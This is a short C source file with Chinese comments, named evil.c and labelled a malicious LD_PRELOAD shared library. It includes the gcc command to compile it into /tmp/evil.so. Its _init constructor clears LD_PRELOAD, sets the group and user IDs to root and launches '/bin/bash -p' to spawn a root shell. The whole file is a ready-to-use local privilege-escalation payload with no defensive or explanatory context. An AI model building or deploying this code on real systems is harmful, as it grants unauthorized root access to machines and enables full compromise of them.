// evil.c - LD_PRELOAD 恶意共享库
// 编译: gcc -fPIC -shared -nostartfiles -o /tmp/evil.so evil.c
#define _GNU_SOURCE   // setresuid/setresgid 需要 _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

// 构造函数: .so 被加载时自动执行
void _init() {
    unsetenv("LD_PRELOAD");        // 防止递归加载
    setresgid(0, 0, 0);            // 组 ID 设为 root
    setresuid(0, 0, 0);            // 用户 ID 设为 root
    system("/bin/bash -p");        // 弹 root shell
}
